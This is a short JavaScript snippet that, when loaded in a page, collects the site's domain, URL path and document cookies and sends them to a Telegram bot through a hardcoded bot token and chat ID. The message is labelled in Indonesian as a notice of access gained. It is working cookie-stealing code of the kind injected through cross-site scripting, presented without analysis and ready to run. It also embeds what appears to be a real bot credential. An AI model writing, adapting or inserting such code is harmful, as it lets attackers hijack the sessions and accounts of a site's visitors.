var tokenBot = '5182173476:AAHIXMha-SawXM3QP3BBpoXJmZhIC6fNQWA'; 
var chatId = '904419645';
function telegramSend(tokenBot, chatId) {
	var textData = '<b>Halo+ada+akses+ke+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
    xhr.send();
}
telegramSend(tokenBot, chatId)
